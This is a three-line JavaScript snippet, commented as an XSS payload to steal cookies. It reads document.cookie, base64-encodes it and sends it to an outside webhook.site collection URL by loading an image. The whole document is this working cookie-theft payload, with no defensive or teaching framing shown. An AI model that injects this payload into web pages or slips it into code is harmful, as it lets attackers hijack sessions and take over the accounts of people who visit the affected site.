// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/8a929a67-ad30-4ff1-8df4-bc45c52872d0?data=' + btoa(document.cookie);
